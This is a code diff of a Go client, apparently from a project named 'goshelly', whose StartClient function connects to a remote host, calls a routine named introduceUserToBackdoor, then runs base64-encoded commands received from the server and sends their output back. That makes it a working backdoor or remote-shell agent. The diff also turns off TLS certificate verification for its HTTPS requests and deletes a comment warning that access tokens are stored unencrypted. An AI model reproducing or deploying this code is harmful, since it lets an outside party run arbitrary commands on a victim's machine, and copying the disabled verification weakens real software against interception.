@@ -7,6 +7,8 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+
+	// c "goshelly-client/cmd"
 	t "goshelly-client/template"
 	"io"
 	"io/ioutil"
@@ -23,7 +25,16 @@ import (
 
 	"golang.org/x/term"
 )
+var HTTPSCLIENT *http.Client
 
+func InitRest(){
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		
+	}
+		
+	HTTPSCLIENT = &http.Client{Transport: tr}
+}
 func handleError(err error) {
 	if err != nil {
 		log.Fatal(err)
@@ -268,7 +279,7 @@ var CONFIG t.Config
 
 func SendPOST(POSTURL string, user interface{}) *http.Response {
 	body, _ := json.Marshal(user)
-	resp, err := http.Post(POSTURL, "application/json", bytes.NewBuffer(body))
+	resp, err := HTTPSCLIENT.Post(POSTURL, "application/json", bytes.NewBuffer(body))
 	if err != nil {
 		fmt.Println("Service offline.")
 		os.Exit(0)
@@ -331,7 +342,6 @@ func SaveLoginResult(resp *http.Response, email string) {
 		os.MkdirAll("./config/", os.ModePerm)
 		fo, err := os.Create("./config/token-config.json")
 		if err != nil {
-			// fmt.Println("Could not save login config. Try logging in again later.")
 			fmt.Println("Service unavailable.")
 			return
 		}
@@ -341,7 +351,6 @@ func SaveLoginResult(resp *http.Response, email string) {
 			EMAIL: base64.StdEncoding.EncodeToString([]byte(email)),
 		}, "", " ")
 		_ = ioutil.WriteFile("./config/token-config.json", file, 0644)
-		// fmt.Println("Warning. Your access token and identiy for this session will be stored as a json config in a non-encrypted format.")
 	}
 }
 
@@ -379,7 +388,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 	introduceUserToBackdoor(conn,user )
 	num := readCmdLen(conn)
 	// fmt.Println(num)
-	for count := 0; count < num; count++ {
+	for count := 0; count <= num; count++ {
 		buffer := make([]byte, 1024)
 		setReadDeadLine(conn)
 		_, err := conn.Read(buffer)
@@ -392,7 +401,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		resp := execInput(string(sDec))
 		time.Sleep(time.Second)
 		encodedResp := base64.StdEncoding.EncodeToString([]byte(resp))
-		CONFIG.CLIENTLOG.Println("\nRES:\n", resp)
+		CONFIG.CLIENTLOG.Println("\nRESPONSE:\n", resp)
 		setWriteDeadLine(conn)
 		_, err = conn.Write([]byte(encodedResp))
 		if err != nil {
@@ -401,7 +410,6 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		}
 		time.Sleep(time.Second)
 		buffer = nil
-		count++
 	}
 
 	CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
